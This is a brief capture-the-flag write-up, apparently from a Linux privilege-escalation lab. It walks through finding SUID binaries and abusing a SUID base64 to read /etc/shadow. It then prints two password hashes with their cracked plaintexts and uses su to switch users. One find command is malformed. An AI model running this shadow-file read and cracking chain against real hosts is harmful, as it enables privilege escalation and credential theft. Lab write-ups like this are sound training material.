Login to the application using provided ssh credentials.
```
# Run following command to check for the files having SUID bit set.
find / -type f -perm -4000 or -4755 2>/dev/null
find / -type f -perm -4000 -ls 2>/dev/null

# We found that passd file have SUID bit set. So we ran and from this we identify new user (gerryconway).
cat /etc/passwd

# To find out the password of user2, we tried to run command but permission denied.
cat /etc/shadow
cat: /etc/shadow: Permission denied

# So we looked for base64 on GTFobins as it also has SUID bit set and we found following binary
## File read
It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.
LFILE=file_to_read (here we insert LFILE=/etc/shadow as we were looking foe passwords of users)
base64 "$LFILE" | base64 --decode

# We ran the above code and we were able to get the hashes of users.
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::

# Crack the hash using hashes.com or john.
gerryconway - test123
user2 - Password1

# Switch to any user.
su user2 0r gerryconway

# using find command looked for flag3.txt
find / -name flag3.txt
 ```
